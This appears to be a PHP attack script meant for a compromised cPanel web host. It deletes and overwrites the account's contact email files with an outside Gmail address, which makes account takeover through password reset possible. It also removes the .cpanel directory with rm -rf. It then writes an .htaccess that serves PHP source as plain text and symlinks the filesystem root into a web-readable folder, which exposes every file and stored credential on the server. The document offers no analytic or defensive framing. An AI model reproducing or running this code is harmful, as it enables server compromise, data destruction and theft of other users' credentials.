<?php
// AUTO CROT
@error_reporting(0); 
@ini_set('error_log',NULL); 
$c0 = @get_current_user();
unlink ("/home/$c0/.contactemail");
$dirname = "/home/".$c0."/.cpanel";
system("rm -rf ".escapeshellarg($dirname));
mkdir("/home/".$c0."/.cpanel" , 0755);
$content = 'ns1.linux.webmaster@gmail.com';
$aaa = fopen("/home/".$c0."/.cpanel/contactinfo", 'w'); fwrite($aaa, $content); fclose($aaa);
$fff = fopen("/home/".$c0."/.contactemail", 'w'); fwrite($fff, $content); fclose($fff);

@mkdir ('gasak',0777);
$htcs	= "Options Indexes FollowSymLinks
DirectoryIndex xXxHsHxXx.htm
AddType txt .php
AddHandler txt .php
";
$f =@fopen ('gasak/.htaccess','w');
fwrite($f , $htcs);


@symlink("/","gasak/kabeh"); // aku benerin 

$pg = basename(_FILE_);

echo "<meta http-equiv=\"refresh\" content=\"0;URL=./gasak/kabeh/\"/>\n";
exit;

?>
